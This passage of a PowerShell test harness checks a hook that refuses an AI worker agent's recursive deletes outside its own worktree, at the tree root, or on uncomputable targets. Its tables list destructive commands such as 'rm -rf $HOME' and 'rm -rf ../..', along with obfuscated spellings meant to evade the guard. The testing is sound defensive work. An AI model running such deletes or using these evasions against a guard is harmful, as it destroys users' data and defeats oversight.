            (New-Wp1H19Row 'c07' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'env -C ../.. rm -rf project'),
            (New-Wp1H19Row 'c08' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'sl ..; Remove-Item -Recurse -Force src/../../wt-D-OWN'),
            (New-Wp1H19Row 'c09' 'tree' 'ownsrc' 'ALLOW' 'none' '' 'ALLOW' 'Set-Location ..; Remove-Item -Recurse -Force src/tmp'),
            # ---- ORDINARY DELETES INSIDE THE TREE: admitted, this rule silent. -------------------------------
            (New-Wp1H19Row 'a01' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf build'),
            (New-Wp1H19Row 'a02' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -r -f src/tmp'),
            (New-Wp1H19Row 'a03' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -fr ./out'),
            (New-Wp1H19Row 'a04' 'tree' 'ownsrc' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf .'),
            (New-Wp1H19Row 'a05' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'Remove-Item -Recurse -Force .\out'),
            (New-Wp1H19Row 'a06' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rmdir /s /q dist'),
            (New-Wp1H19Row 'a07' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -f file.txt'),
            (New-Wp1H19Row 'a08' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf "dir with space"'),
            (New-Wp1H19Row 'a09' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf ./node_modules'),
            (New-Wp1H19Row 'a10' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' "rm -rf $h19OwnF/src/tmp"),
            (New-Wp1H19Row 'a11' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' "rm -rf $h19OwnShort/src/tmp"),
            (New-Wp1H19Row 'a12' 'tree' 'ownsrc' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf ../src/tmp'),
            (New-Wp1H19Row 'a13' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf build 2>/dev/null'),
            (New-Wp1H19Row 'a14' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'Remove-Item -Recurse -Force out -ErrorAction SilentlyContinue 2>$null'),
            (New-Wp1H19Row 'a15' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'if (Test-Path out) { Remove-Item -Recurse -Force out }'),
            (New-Wp1H19Row 'a16' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf ../wt-D-OWN/build'),
            (New-Wp1H19Row 'a17' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'Remove-Item -Recurse:$true -Force out'),
            (New-Wp1H19Row 'a18' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'git status --porcelain'),
            (New-Wp1H19Row 'a19' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'echo rm -rf .'),
            # ---- THE ANCESTOR FOR A VERB THAT IS NOT A RECURSIVE DELETE: still no rule names it. -------------
            (New-Wp1H19Row 'b01' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'ls ../..'),
            # ---- NO PAYLOAD CWD: a relative target is uncomputable, a rooted one is judged. ------------------
            (New-Wp1H19Row 'x01' 'tree' 'none' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf build'),
            (New-Wp1H19Row 'x02' 'tree' 'none' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf .'),
            (New-Wp1H19Row 'x03' 'tree' 'none' 'ALLOW' 'none' '' 'ALLOW' "rm -rf $h19OwnF/build"),
            # ---- NO ANCHOR places the own tree: H-18's o03/o06/o09/o12 deletes are refused (D3's cost). ------
            (New-Wp1H19Row 'n01' 'noanchor' 'own' 'DENY' 'rd' 'noroot' 'ALLOW' "rm -rf $h19OwnF/src"),
            (New-Wp1H19Row 'n02' 'noanchor' 'own' 'DENY' 'rd' 'noroot' 'ALLOW' 'rm -rf src'),
            (New-Wp1H19Row 'n03' 'noanchor' 'ownsrc' 'DENY' 'rd' 'noroot' 'ALLOW' 'rm -rf ../src'),
            (New-Wp1H19Row 'n04' 'noanchor' 'own' 'DENY' 'rd' 'noroot' 'ALLOW' 'rm -rf ../wt-D-OWN/src'),
            (New-Wp1H19Row 'n05' 'noanchor' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -f file.txt'),
            # ---- LAM_WORKTREE = the own tree, CLAUDE_PROJECT_DIR elsewhere. ----------------------------------
            (New-Wp1H19Row 'w01' 'wtenv' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf *'),
            (New-Wp1H19Row 'w02' 'wtenv' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -rf .'),
            (New-Wp1H19Row 'w03' 'wtenv' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf ../..'),
            (New-Wp1H19Row 'w04' 'wtenv' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf $HOME'),
            (New-Wp1H19Row 'w05' 'wtenv' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf build'),
            (New-Wp1H19Row 'w06' 'wtenv' 'ownsrc' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf .'),
            (New-Wp1H19Row 'w07' 'wtenv' 'own' 'ALLOW' 'none' '' 'ALLOW' 'rm -rf src'),
            (New-Wp1H19Row 'w08' 'wtenv' 'none' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf ./node_modules'),
            (New-Wp1H19Row 'w09' 'wtenv' 'outside' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf build'),
            (New-Wp1H19Row 'w10' 'wtenv' 'none' 'ALLOW' 'none' '' 'ALLOW' "rm -rf $h19OwnF/build")
        )

        # ---- THE ROWS, THROUGH THE REAL HOOK. -------------------------------------------------------------
        $env:MISSION_DISPATCH_ID = $h19Id
        foreach ($r in $h19Rows) {
            $proj = if ($r.mode -eq 'tree') { $h19Own } else { $sandbox }
            foreach ($role in @('worker', 'seat')) {
                $tools = if ($role -eq 'worker') { @('Bash', 'PowerShell') } else { @('Bash') }
                foreach ($tool in $tools) {
                    $pm = [ordered]@{ session_id = $h19Id; hook_event_name = 'PreToolUse'; tool_name = $tool; tool_input = @{ command = $r.text } }
                    if ($r.cwd -ne 'none') { $pm['cwd'] = $h19Cwds[$r.cwd] }
                    $payload = $pm | ConvertTo-Json -Depth 8 -Compress
                    $before = @(Get-Wp1H18Denials -Proj $proj -DispatchId $h19Id)
                    $env:CLAUDE_PROJECT_DIR = $proj
                    if ($role -eq 'worker') { $env:LAM_DISPATCH = $h19Worker } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
                    if ($r.mode -eq 'wtenv') { $env:LAM_WORKTREE = $h19Own } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
                    try {
                        $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
                    } finally {
                        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
                        Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
                        $env:CLAUDE_PROJECT_DIR = $h19SavedProj
                    }
                    $after = @(Get-Wp1H18Denials -Proj $proj -DispatchId $h19Id)
                    $got = if (($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')) { 'DENY' }
                           elseif (($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')) { 'ALLOW' }
                           else { 'OTHER' }
                    $newRecs = @($after | Select-Object -Skip $before.Count)
                    # THE RECORDS ARE READ, THEN THE TREE'S OWN RUNTIME PLANE IS REMOVED: in mode tree the hook writes its record under
                    # the own tree (CLAUDE_PROJECT_DIR), and a glob row expanded there would otherwise meet the record directory and be
                    # refused by A1's parent tier -- a verdict that would depend on row order, not on the rule.
                    if ($proj -eq $h19Own) {
                        $h19Rt = Join-Path $h19Own ('.mission' + '-runtime')
                        if (Test-Path -LiteralPath $h19Rt) { Remove-Item -LiteralPath $h19Rt -Recurse -Force }
                    }
                    $recReason = if ($newRecs.Count -ge 1) { [string](Get-EntryField $newRecs[0] 'reason' '') } else { '' }
                    $byRd = ($res.stdout -like '*RECURSIVE DELETE*')
                    $byPeer = ($res.stdout -like '*PEER WORKTREE*')
                    if ($role -eq 'worker') {
                        $want = $r.want
                        $ruleOk = if ($r.rule -eq 'rd') { $byRd -and -not $byPeer } elseif ($r.rule -eq 'peer') { $byPeer -and -not $byRd } else { (-not $byRd) -and (-not $byPeer) }
                        $condOk = $true
                        if ($r.rule -eq 'rd') {
                            $condOk = if ($r.cond -eq 'uncomputable') { $recReason.Contains('which is UNCOMPUTABLE:') }
                                      elseif ($r.cond -eq 'root') { $recReason.Contains("IS the worker's own tree ROOT:") }
                                      elseif ($r.cond -eq 'noroot') { $recReason.Contains('no own tree root could be derived') }
                                      else { $recReason.Contains("lies OUTSIDE the worker's own tree:") -and -not $recReason.Contains('no own tree root could be derived') }
                        }
                    } else {
                        $want = $r.base
                        $ruleOk = -not $byRd
                        $condOk = $true
                    }
                    $ok = ($got -eq $want) -and $ruleOk -and $condOk
                    $recOk = if ($got -eq 'DENY') {
                        ($newRecs.Count -eq 1) -and
                        ([string](Get-EntryField $newRecs[0] 'command' '') -eq $r.text) -and
                        ([string](Get-EntryField $newRecs[0] 'outcome' '') -eq 'denied') -and
                        (($role -ne 'worker') -or ($r.rule -ne 'rd') -or ($recReason -like "*RECURSIVE DELETE*dispatched worker '$h19Worker'*")) -and
                        (($role -ne 'worker') -or ($r.rule -ne 'peer') -or ($recReason -like '*PEER WORKTREE*'))
                    } else { ($newRecs.Count -eq 0) }
                    [void]$h19Results.Add([pscustomobject]@{ id = $r.id; mode = $r.mode; rule = $r.rule; cond = $r.cond; role = $role; tool = $tool; got = $got; ok = $ok; recOk = $recOk })
                    [void]$h19Lines.Add(('      {0,-4} {1,-8} {2,-6} {3,-10} want={4,-5} got={5,-5} exit={6} rule={7,-4} cond={8,-12} record={9,-5} {10}   {11}' -f
                        $r.id, $r.mode, $role, $tool, $want, $got, $res.exit, $(if ($role -eq 'worker') { $r.rule } else { '-' }),
                        $(if ($role -eq 'worker' -and $r.rule -eq 'rd') { "$($r.cond):$condOk" } else { '-' }), $recOk,
                        $(if ($ok -and $recOk) { 'MATCH  ' } else { 'DIVERGE' }), $r.text))
                }
            }
        }

        # ---- THE PREDICATE ASKED DIRECTLY, AT ITS EDGES (in this process, LAM_WORKTREE = the own tree). ------
        $env:CLAUDE_PROJECT_DIR = $sandbox
        $env:LAM_WORKTREE = $h19Own
        $h19Src = Join-Path $h19Own 'src'
        $h19Ask = { param([string]$Cmd, [string]$Cwd)
            $af = Get-EvidenceRecursiveDeleteFinding -Command $Cmd -Cwd $Cwd -DispatchId $h19Worker
            if ($null -eq $af) { 'none' } else { [string]$af['condition'] } }
        $h19Table = { param([string[]]$Cmds, [string]$Cwd, [string]$Want)
            $miss = @($Cmds | Where-Object { (& $h19Ask $_ $Cwd) -ne $Want })
            return @{ ok = ($miss.Count -eq 0) -and ($Cmds.Count -gt 0); n = $Cmds.Count; miss = ($miss -join ' || ') } }
        $e = [ordered]@{}
        $eMiss = [ordered]@{}
        $h19RecA = @('rm -rf .', 'rm -fr .', 'rm -vfR .', 'rm . -rf', 'rm --recursive .', 'rm --r .', 'rm --recu .', 'rm -r -f .')
        $h19RecB = @('Remove-Item -Recurse .', 'remove-item -Rec .', 'Remove-Item -Rec:$true .', 'Remove-Item -r:1 .',
                     'Microsoft.PowerShell.Management\Remove-Item -Recurse .', 'ri -Recurse .', 'del -Recurse .', 'erase -Recurse .',
                     'rd -Recurse .', 'rmdir -Recurse .', 'Remove-Item -Path . -Recurse', 'Remove-Item -LiteralPath:. -Recurse')
        $h19RecC = @('rmdir /s .', 'rd /S/Q .', 'rd /q/s .', 'del /s .', 'erase /S .', 'rd/s/q .', 'rmdir /S /Q .')
        $h19RecLead = @('/usr/bin/rm -rf .', '\rm -rf .', 'r\m -rf .', 'rm.exe -rf .', 'C:\tools\rm.exe -rf .', 'r""m -rf .', '"rm" -rf .',
                        'sudo rm -rf .', 'command rm -rf .', 'exec rm -rf .', 'env X=1 rm -rf .', 'nice -n 5 rm -rf .', 'timeout 5 rm -rf .',
                        'eval "rm -rf ."', 'bash -c "rm -rf ."', 'sh -c "rm -rf ."', 'cmd /c rd /s /q .', 'cmd.exe /C "rd /s /q ."',
                        'powershell -Command "Remove-Item -Recurse ."', 'pwsh -c "Remove-Item -Recurse ."', 'X=1 rm -rf .', '{ rm -rf .; }',
                        'f() { rm -rf .; }', 'if true; then rm -rf .; fi', 'for d in a; do rm -rf .; done',
                        'if (1) { Remove-Item -Recurse -Force . }', '$x = Remove-Item -Recurse .', 'Invoke-Expression "Remove-Item -Recurse ."',
                        'echo x && rm -rf .', 'echo x | rm -rf .', '(rm -rf .)', ('ls \' + [string][char]10 + 'rm -rf .'),
                        ('r\' + [string][char]10 + 'm -rf .'))
        $h19NotRec = @('rm -f .', 'rm --force .', 'rm -d x', 'Remove-Item .', 'Remove-Item -Force x', 'rmdir x', 'del x', 'echo rm -rf .',
                       'git commit -m "rm -rf ."', 'grep -rn "rm -rf" .', 'git rm -r .', 'find . -delete', 'git clean -fdx',
                       'rm -rf build', 'Remove-Item -Recurse -Force .\build', 'rmdir /s /q build', 'cd src && rm -rf tmp')
        $h19Uncomp = @('rm -rf $HOME', 'rm -rf ${HOME}', ('rm -rf ' + $h19Bt + 'pwd' + $h19Bt), 'rm -rf ~', 'rm -rf ~/x', 'rm -rf a=~/x',
                       'rm -rf %USERPROFILE%', 'rd /s /q !X!', 'rm -rf {a,b}', 'rm -rf *', 'rm -rf x?', 'rm -rf [ab]', 'Remove-Item -Recurse @p',
                       'Remove-Item -Recurse FileSystem::x', 'rd /s /q C:x', 'Remove-Item -Recurse HKCU:\x', 'rm -rf $(echo ../..)',
                       'xargs rm -rf', 'find . -exec rm -rf {} +', 'Remove-Item -Recurse (Get-Item x)', 'Get-ChildItem x | Remove-Item -Recurse',
                       'rm -$f x', 'cd $HOME && rm -rf x', 'cd - && rm -rf x', 'cd && rm -rf x', 'popd; rm -rf x', 'cd a b && rm -rf y',
                       'env -C .. rm -rf x', 'sudo -D .. rm -rf x', 'rm -rf a>b')
        foreach ($pair in @(@('e01a (a) rm short and long options recognised, target the root', $h19RecA, $h19Own, 'root'),
                            @('e01b (b) Remove-Item and its aliases with -Recurse recognised       ', $h19RecB, $h19Own, 'root'),
                            @('e01c (c) rmdir/rd/del/erase with /s recognised                      ', $h19RecC, $h19Own, 'root'),
                            @('e01d leads, escapes, quotes, blocks, assignments, continuations     ', $h19RecLead, $h19Own, 'root'),
                            @('e02 NOT recognised: not recursive, not a command, or a stated bound ', $h19NotRec, $h19Own, 'none'),
                            @('e03 uncomputable: every listed character, no static target, cd     ', $h19Uncomp, $h19Own, 'uncomputable'))) {
            $t = & $h19Table $pair[1] $pair[2] $pair[3]
            $e["$($pair[0]) ($($t.n))"] = $t.ok
            if (-not $t.ok) { $eMiss[$pair[0]] = $t.miss }
        }
        $e['e04 the / boundary: ../wt-D-OWN2 (a prefix-sharing sibling) is OUTSIDE'] = ((& $h19Ask 'rm -rf ../wt-D-OWN2' $h19Own) -eq 'outside') -and
                                                                                  ((& $h19Ask "rm -rf $($h19OwnF)2" $h19Src) -eq 'outside')
        $e['e05 the tree root itself: . at the root and ../wt-D-OWN are ROOT       '] = ((& $h19Ask 'rm -rf .' $h19Own) -eq 'root') -and
                                                                                  ((& $h19Ask 'rm -rf ../wt-D-OWN' $h19Own) -eq 'root') -and
                                                                                  ((& $h19Ask 'rm -rf .' $h19Src) -eq 'none')
        $e['e06 no payload cwd: a relative target is uncomputable, a rooted one judged'] = ((& $h19Ask 'rm -rf build' '') -eq 'uncomputable') -and
                                                                                  ((& $h19Ask "rm -rf $h19OwnF/build" '') -eq 'none')
        Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
        $e06f = Get-EvidenceRecursiveDeleteFinding -Command 'rm -rf build' -Cwd $h19Own -DispatchId $h19Worker
        $e['e07 the PAYLOAD CWD is no anchor: cwd = the own tree, no anchor -> noroot'] = ($null -ne $e06f) -and ($e06f['condition'] -eq 'outside') -and
                                                                                  ([string]$e06f['detail']).Contains('no own tree root could be derived')
        $env:LAM_WORKTREE = $h19Own
        # FORK F4, BOTH HALVES, by redefining this rule's own functions in this process and restoring them.
        $h19SavedSeg    = ${function:Get-EvidenceRecursiveDeleteSegments}
        $h19SavedTarget = ${function:Get-EvidenceRecursiveDeleteTargetFinding}
        $h19SavedScreen = ${function:Test-EvidenceRecursiveDeleteMentioned}
        $script:h19RecogCalls = 0
        try {
            ${function:Get-EvidenceRecursiveDeleteSegments} = { param($Command) $script:h19RecogCalls++; throw 'planted recognition failure' }
            $f4a = & $h19Ask 'rm -rf build' $h19Own
            $f4b = & $h19Ask 'git status --porcelain' $h19Own
            $f4calls = $script:h19RecogCalls
            $env:LAM_DISPATCH = $h19Worker
            try {
                $f4d = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = 'rm -rf build' }) -Cwd $h19Own
                $f4u = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = 'git status --porcelain' }) -Cwd $h19Own
            } finally { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
            $f4s = Get-EvidenceGuardDecision -ToolName 'Bash' -ToolInput ([pscustomobject]@{ command = 'git status --porcelain' }) -Cwd $h19Own
            ${function:Get-EvidenceRecursiveDeleteSegments} = $h19SavedSeg
            ${function:Get-EvidenceRecursiveDeleteTargetFinding} = { param($Target, $Bases, $OwnRoots) throw 'planted evaluation failure' }
            $f4c = & $h19Ask 'rm -rf build' $h19Own
            ${function:Get-EvidenceRecursiveDeleteTargetFinding} = $h19SavedTarget
            ${function:Test-EvidenceRecursiveDeleteMentioned} = { param($Command) throw 'planted pre-screen failure' }
            $f4p = & $h19Ask 'rm -rf .' $h19Own
        } finally {
            ${function:Get-EvidenceRecursiveDeleteSegments} = $h19SavedSeg
            ${function:Get-EvidenceRecursiveDeleteTargetFinding} = $h19SavedTarget
            ${function:Test-EvidenceRecursiveDeleteMentioned} = $h19SavedScreen
        }
        $e['e08 F4: recognition throws -> DENY a delete, never an unrelated command'] = ($f4a -eq 'error') -and ($f4b -eq 'none') -and ($f4calls -eq 1) -and
            ($f4d.decision -eq 'deny') -and ([string]$f4d.reason).Contains('could not evaluate') -and ($f4u.decision -eq $f4s.decision) -and ($f4u.reason -eq $f4s.reason)
        $e['e09 F4: evaluation throws -> DENY; pre-screen throws -> adds nothing   '] = ($f4c -eq 'error') -and ($f4p -eq 'none') -and ((& $h19Ask 'rm -rf .' $h19Own) -eq 'root')
        # THE PRE-SCREEN'S SUPERSET CLAIM, over a generated corpus: every spelling recognition hits (pre-screen forced
        # true) the real pre-screen matches.
        $h19Verbs = @('rm', 'Remove-Item', 'ri', 'del', 'erase', 'rd', 'rmdir', 'Microsoft.PowerShell.Management\Remove-Item')
        $h19Decor = @({ param($v) $v }, { param($v) '"' + $v + '"' }, { param($v) $v.Substring(0, 1) + "''" + $v.Substring(1) },
                      { param($v) $v.Substring(0, 1) + $h19Bt + $v.Substring(1) }, { param($v) '\' + $v }, { param($v) $v.Substring(0, 1) + '\' + $v.Substring(1) },
                      { param($v) $v.Substring(0, 1) + '^' + $v.Substring(1) }, { param($v) 'C:\bin\' + $v + '.exe' },
                      { param($v) 'C:\bin\' + $v.Substring(0, 1) + '"' + $v.Substring(1) + '"' }, { param($v) '{' + $v },
                      { param($v) '$x=' + $v }, { param($v) $v.Substring(0, 1) + '\' + [string][char]10 + $v.Substring(1) })
        $h19Corpus = 0; $h19Hit = 0; $h19Viol = New-Object System.Collections.Generic.List[string]
        foreach ($v in $h19Verbs) {
            foreach ($d in $h19Decor) {
                foreach ($fl in @('-rf', '-Recurse', '/s')) {
                    $cmd = (& $d $v) + ' ' + $fl + ' .'
                    $h19Corpus++
                    $screen = [bool](& $h19SavedScreen -Command $cmd)
                    ${function:Test-EvidenceRecursiveDeleteMentioned} = { param($Command) $true }
                    try { $gf = Get-EvidenceRecursiveDeleteFinding -Command $cmd -Cwd $h19Own -DispatchId $h19Worker }
                    finally { ${function:Test-EvidenceRecursiveDeleteMentioned} = $h19SavedScreen }
                    if ($null -ne $gf) { $h19Hit++; if (-not $screen) { [void]$h19Viol.Add($cmd) } }
                }
            }
        }
        $e["e10 F4: the pre-screen misses nothing recognition hits ($h19Hit of $h19Corpus hit)"] = ($h19Viol.Count -eq 0) -and ($h19Hit -ge 100)
        if ($h19Viol.Count) { $eMiss['e10'] = ($h19Viol -join ' || ') }
        $h19PredOk = (@($e.Values | Where-Object { -not $_ }).Count -eq 0)
        foreach ($k in $e.Keys) { [void]$h19EdgeLines.Add(('        {0} -> {1}' -f $k, $e[$k])) }
        foreach ($k in $eMiss.Keys) { [void]$h19EdgeLines.Add(('          MISSED in {0}: {1}' -f $k.Trim(), $eMiss[$k])) }
    }
} finally {
    $env:CLAUDE_PROJECT_DIR = $h19SavedProj
    $env:MISSION_DISPATCH_ID = $h19SavedDispatch
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h19SavedWorktree) { $env:LAM_WORKTREE = $h19SavedWorktree } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
    if ($h19SavedCeiling) { $env:GIT_CEILING_DIRECTORIES = $h19SavedCeiling } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($h19Root -and (Test-Path -LiteralPath $h19Root)) { Remove-Item -LiteralPath $h19Root -Recurse -Force -ErrorAction SilentlyContinue }
}
$h19Res = $h19Results.ToArray()
$h19Bad = @($h19Res | Where-Object { -not ($_.ok -and $_.recOk) })
$h19WorkerOk = (@($h19Res | Where-Object { $_.role -eq 'worker' -and -not $_.ok }).Count -eq 0)
$h19SeatOk   = (@($h19Res | Where-Object { $_.role -eq 'seat' -and -not $_.ok }).Count -eq 0)
$h19RecOk    = (@($h19Res | Where-Object { -not $_.recOk }).Count -eq 0)
# NON-VACUITY: a table that lost rows, a tool, a role or a mode would report zero divergences.
$h19nRows   = @($h19Rows).Count
$h19nWorker = @($h19Res | Where-Object { $_.role -eq 'worker' }).Count
$h19nSeat   = @($h19Res | Where-Object { $_.role -eq 'seat' }).Count
$h19nPs     = @($h19Res | Where-Object { $_.tool -eq 'PowerShell' }).Count
$h19nRd     = @($h19Res | Where-Object { $_.role -eq 'worker' -and $_.rule -eq 'rd' -and $_.got -eq 'DENY' }).Count
$h19nPeer   = @($h19Res | Where-Object { $_.role -eq 'worker' -and $_.rule -eq 'peer' -and $_.got -eq 'DENY' }).Count
$h19nAllow  = @($h19Res | Where-Object { $_.role -eq 'worker' -and $_.rule -eq 'none' -and $_.got -eq 'ALLOW' }).Count
$h19nCond   = (@('uncomputable', 'root', 'outside', 'noroot') | ForEach-Object { $c = $_; '{0} {1}' -f $c, @($h19Res | Where-Object { $_.role -eq 'worker' -and $_.rule -eq 'rd' -and $_.cond -eq $c }).Count }) -join ', '
$h19nModes  = (@('tree', 'wtenv', 'noanchor') | ForEach-Object { $m = $_; '{0} {1}' -f $m, @($h19Rows | Where-Object { $_.mode -eq $m }).Count }) -join ', '
$h19Reached = ($h19nRows -eq 113) -and ($h19nWorker -eq 226) -and ($h19nSeat -eq 113) -and ($h19nPs -eq 113) -and
              ($h19nRd -eq 148) -and ($h19nPeer -eq 20) -and ($h19nAllow -eq 58) -and ($h19nModes -eq 'tree 98, wtenv 10, noanchor 5')
$h19detail = @"
    THE WORKER RECURSIVE-DELETE RULE (b1s6 item 2). A dispatched worker's recursive delete -- rm -r/-R/--recursive in
    any spelling, Remove-Item -Recurse and its aliases, rmdir/rd/del/erase /s -- is refused when a target is
    uncomputable, outside its own tree (whose root comes from LAM_WORKTREE and CLAUDE_PROJECT_DIR only), or the tree
    root itself; a static target strictly inside the own tree is admitted; the seat never evaluates the rule. Driven
    through the REAL hook against a git-built fixture under the temp root; worker = LAM_DISPATCH=$h19Worker, seat = unset.
      fixture root : $h19Tb
      F-0 fixture shape                                         : $h19F0   (expect True)
$($h19F0Lines -join ([string][char]10))
      worker rows: verdict, deciding rule and condition as stated  : $h19WorkerOk   (expect True -- $h19nWorker invocations, Bash and PowerShell)
      seat rows: the base verdict, this rule silent                : $h19SeatOk   (expect True -- $h19nSeat invocations)
      one denial record per refusal naming its rule, none per admission : $h19RecOk   (expect True)
      table reached   : $h19Reached   (expect True -- rows 113; worker 226 of which refused by this rule 148, by the peer rule 20,
                        admitted 58; seat 113; PowerShell 113; modes $h19nModes (expect tree 98, wtenv 10, noanchor 5))
      this rule's conditions (worker invocations) : $h19nCond
      divergences     : $($h19Bad.Count)   (expect 0)
      predicate asked directly at its edges                        : $h19PredOk   (expect True)
$($h19EdgeLines -join ([string][char]10))
$($h19Lines -join ([string][char]10))
    WHAT THE ROWS SHOW. The ORDER's cases both ways: the uncomputable targets (a dollar variable, ~, %USERPROFILE%, a dollar-paren
    substitution, braces, globs, xargs and find -exec feeding no static target, a sub-expression, a provider or
    drive-relative colon), the tree root in every recognised spelling of (a), (b), (c) and the leads, the ancestors and
    drive roots OUTSIDE the tree, and the ordinary deletes inside it that still allow (rm -rf build, rm -r -f src/tmp,
    rm -fr ./out, rm -rf . from a subdirectory, Remove-Item -Recurse -Force .\out, rmdir /s /q dist, a quoted name with
    spaces, a redirect, a block). The p-rows are refused by the PEER rule, which runs first: rm -rf .. from the root
    names the home. The noanchor rows are H-18's four own deletes with no anchor placing the own tree: REFUSED.
    WHAT IS NOT REACHED (a tripwire, not a boundary) -- stated in the library block, measured where a row can:
      * b01: the ancestor '../..' for a verb that is not a recursive delete still allows -- no rule names the ancestor.
      * e02: git rm -r, find -delete and git clean are not recursive deletes by ruling D2 and are not recognised; nor is
        a verb a command merely echoes, or a commit message that quotes one.
      * A link inside the own tree is judged by its name; a delete computed from text carrying none of the listed
        characters (an alias or function from an earlier call, a script file, an unquoted variable supplying -rf), a
        heredoc body fed to an interpreter, an unlisted lead, and any interpreter that deletes without these verbs.
    PRE-EXISTING, NOT THIS RULE'S (seat-side, unchanged): the seat's base verdict is ALLOW for every row here, including
    x02 'rm -rf .' with no payload cwd -- the command's whole-text trailing-dot form offered to A1's matcher makes its
    repo-wide rule see a second, non-bare target -- while A1's own decision alone refuses it.
"@
Check -Id 'H-19' -Title "a dispatched worker's recursive delete (rm -r/-rf/-fr/-r -f in any spelling, Remove-Item -Recurse and its aliases, rmdir/rd/del/erase /s, behind any listed lead) is refused when its target is uncomputable, outside its own tree or the tree root, with the condition named; ordinary deletes inside the tree allow; no anchor refuses them; the seat returns every base verdict; each refusal is recorded" `
      -Ok ($h19F0 -and $h19WorkerOk -and $h19SeatOk -and $h19RecOk -and $h19Reached -and ($h19Bad.Count -eq 0) -and $h19PredOk) -Detail $h19detail

# =============================================================================================
# H-13 -- THE '..' FORM-BUILDER SUITE IS DRIVEN FROM HERE, AND ITS VERDICT IS THIS MEMBER'S
# =============================================================================================
# WHY THIS MEMBER EXISTS. An earlier cure for the '..' form builder shipped with its own
# suite, tools/evidence-hooks-next/tests/test-dotsegment-forms.ps1, and NOTHING IN THE TREE
# REFERENCED IT: a repository-wide search for that file's name across .ps1, .md, .py and .json
# returned the file itself and nothing else. No runner drove it, no document named it, and no
# runner globs that directory. A suite nothing drives is not a member -- it rots silently the
# first time the library moves under it, and its evidence is attached to no verdict at all. This
# member is the wire.
#
# WHY THE ID IS H-13, so the next reader does not re-derive the reservation. H-11 is RESERVED,
# not free: an earlier revision records "There is no H-11: it was reverted with the cure it could not
# falsify", and that H-11 was the member built for AN EARLIER ROW (a worker's own worktree
# exempted from the .claude tier). That row is still OPEN -- retried and refuted a third time --
# so H-11 stays held for whoever finally closes that row, exactly as H-12's own banner below
# explains. H-12 is taken by the permission-layer member immediately below. The next free id is
# therefore H-13.
#
# WHY A MEMBER OF ITS OWN AND NOT A CONJUNCT OF H-4. H-4 is the A1 negative suite's regression
# line and carries that suite's own expected tally (14 checks, N1..N12c). Folding a second suite
# into it would make one RED row mean either of two unrelated regressions, and would bury this
# suite's evidence inside another member's detail block. A member of its own puts the '..'
# form-builder's outcome on its own line in the verdict, which is the whole point of wiring it.
#
# THE IDIOM IS H-4'S, deliberately, rather than a second one for the same job. The same PS 5.1
# trap is load-bearing here: under $ErrorActionPreference = 'Stop', ANY output a native executable
# writes to stderr is raised as a fatal NativeCommandError -- and `2>$null` does not help, because
# the error is raised on the write, not on the read. This suite DRIVES DENY PATHS ON PURPOSE
# (F-5's seven rows and F-6's eight deny controls all go through the real guard, which writes
# every refusal to stderr by design), so the suite's CORRECT behaviour would abort the instrument
# that runs it. Preference is relaxed around this call only and restored in `finally`.
#
# WHAT THE MEMBER BINDS, so it cannot pass over an absent, silent or lying suite:
#   a) the file is PRESENT at the path this instrument names. Deliberately NOT added to F-0:
#      F-0's absent branch exits the whole instrument before every behavioural member runs, so a
#      deleted suite would take 21 other verdicts with it. Here it is RED in one row, alone.
#   b) the child process actually RAN and produced output;
#   c) the exit code is 0 -- the suite's documented contract is "Exit code 0 = all checks passed.
#      Non-zero = count of failures.";
#   d) the per-check tally read off the suite's own [PASS]/[FAIL] lines is 5 run, 0 failed;
#   e) the five check ids are exactly F-1, F-2, F-3, F-5, F-6 -- SET EQUALITY, so a check that is
